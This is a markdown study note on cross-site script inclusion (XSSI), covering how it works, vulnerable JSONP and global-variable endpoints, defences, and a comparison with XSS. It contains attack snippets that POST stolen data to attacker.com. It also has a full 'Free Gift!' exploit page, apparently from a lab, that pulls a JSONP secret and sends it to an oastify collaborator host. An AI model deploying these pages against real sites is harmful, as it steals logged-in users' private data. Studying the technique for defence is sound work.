# XSSI

## Definition
```
XSSI is stealing data from  another website by including their Javascript file in your malicious page.
```

## How it works
### Normal scenario
```
HTML
<!-- On bank.com -->
<script src="/api/account.js"></script>

<!-- account.js contains: -->
var accountBalance = 50000;
var accountNumber = "123456789";
```

### The attack - the attacker creates a malicious page
```
HTML
<!-- On attacker.com -->
<script src="https://bank.com/api/account.js"></script>
<script>
    // Can now read the victim's data
    alert(accountBalance); // Shows: 50000
</script>
```

When victim visits attacker.com while logged into bank.com
- Browser includes bank.com's script
- Script executes with victim's cookies
- Attacker steals the data

## Why it works
- <script> tags ignore Same Origin Policy
- Browser automatically sends cookies with the request
- Javascript executes in attacker's page context
- Attacker can read any global variables

## Real example
### Vulnerable endpoint
```
JS
// https://example.com/api/user-data.js
var userData = {
    email: "victim@email.com",
    phone: "555-1234",
    address: "123 Main St"
};
```

### Attack
```
HTML
<script src="https://example.com/api/user-data.js"></script>
<script>
    // Send stolen data to attacker
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(userData)
    });
</script>
```

## Common vulnerable endpoints
### 1. JSONP endpoints
```
JS
callback({"secret": "data"});
```
### 2. Javascript arrays
```
JS
var messages = ["Private message 1", "Private message 2"];
```
### 3. Direct variable assignment
```
JS
var token = "SECRET_TOKEN_123";
```

## Defense
Don't serve sentisive data as executable JavaScript
Instead use:
- Proper JSON (not JSONP)
- Check ```Content-Type: application/json```
- Require custom headers (```X-Requested-With```)
- Use CORS properly

## XSSI vs XSS
- XSSI: Where = Attacker's site, Goal = Steal data, Requires = Victim logged in
- XSS : Where = Victim's site, Goal = Execute code, Requires = Vulnerable endpoint

## Summary:
- XSSI : Including victim's Javascript file to steal their data
- Key: Only Work if sensitive data is in executable Javascript format

## Exploit
```
HTML # Serve as xssi.html
<!DOCTYPE html>
<html>
<head>
    <title>Free Gift!</title>
</head>
<body>
    <h1>Loading your prize...</h1>
    
    <script>
    // Define the callback function that the JSONP will call
    function display(data) {
        // Send stolen secret to your server
        fetch('https://burp.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(data)
        });
        
        // Or display it
        alert('Stolen secret: ' + data.secret);
    }
    </script>
    
    <!-- Include the victim's JSONP endpoint -->
    <script src="https://www.libcurl.me/secrets.js"></script>
</body>
</html>
```

## JSON vs JSONP
### JSON
- JSON is pure data format ```{"name": "John", "balance": 5000}```
- Can't execute as JavaScript
    ```
    <script src="https://api.com/data.json"></script>
    <!-- Browser tries to execute it → SYNTAX ERROR -->
    <!-- Attacker can't read it -->
    ```
- Safe because:
    - Not valid JavaScript
    - ``<script>`` tag fails to execute it
    - Attacker gets nothing

### JSONP
- JSON wrapped in a function call ```callback({"name": "John", "balance": 5000});```
- CAN execute as JavaScript
    ```
    <script>
    function callback(data) {
        // Attacker controls this function
        alert(data.balance); // 5000 - STOLEN!
    }
    </script>

    <script src="https://api.com/data.jsonp?callback=callback"></script>
    <!-- Executes successfully → data stolen -->
    ```
- Vulnerable because:
    - Valid JavaScript
    - Executes in attacker's page
    - Attacker's function receives the data


